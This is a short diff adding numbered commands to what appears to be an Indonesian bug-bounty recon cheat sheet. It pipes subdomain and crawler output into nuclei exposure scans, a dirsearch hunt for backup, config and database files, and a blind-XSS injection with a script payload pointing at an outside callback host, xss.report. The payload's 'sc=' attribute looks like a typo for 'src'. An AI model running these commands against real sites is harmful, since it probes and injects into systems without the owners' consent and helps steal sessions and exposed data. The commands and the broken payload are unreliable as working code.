@@ -140,4 +140,8 @@ part2 cara recon
 
 7. echo nama domain | katana -ps | grep -E "\.js$"| nuclei -t /http/exposures/ -c 30
 
-8. 
+8. dirsearch -u nama domain -e conf,config,bak,backup,swp,old,db,sql,asp,aspx~,asp~,py,py~,rb,rb~,php,php~,bak,bkp,cache,cgi,conf,csv,html,inc,jar,js,json,jsp,jsp~,lock,log,rar,old,sql,sql.gz,http://sql.zip,sql.tar.gz,sql~,swp,swp~,tar,tar.bz2,tar.gz,txt,wadl,zip,.log,.xml,.js.,.json
+
+9. subfinder -d nama domain | httpx-toolkit -silent | katana -ps -f qurl | gf xss | bxss --appendMode -payload '"><script sc=https://xss.report/c/coffinxp></script>' -parameters
+
+10. 
